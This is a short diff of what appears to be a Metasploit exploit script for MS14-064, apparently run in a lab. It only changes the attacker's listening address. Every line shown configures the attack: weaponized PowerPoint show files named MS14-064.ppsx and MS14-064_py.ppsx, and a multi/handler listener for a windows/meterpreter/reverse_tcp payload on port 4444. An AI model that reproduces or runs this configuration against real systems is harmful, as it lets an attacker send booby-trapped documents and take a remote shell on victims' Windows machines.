@@ -22,7 +22,7 @@ show options
 
 set FILENAME MS14-064.ppsx
 
-set LHOST 10.191.1.6
+set LHOST 192.168.0.15
 
 set LPORT 4444
 
@@ -38,7 +38,7 @@ show options
 
 set FILENAME MS14-064_py.ppsx
 
-set LHOST 10.191.1.6
+set LHOST 192.168.0.15
 
 set LPORT 4444
 
@@ -49,7 +49,7 @@ use exploit/multi/handler
 
 set PAYLOAD windows/meterpreter/reverse_tcp
 
-set LHOST 10.191.1.6
+set LHOST 192.168.0.15
 
 set LPORT 4444
 
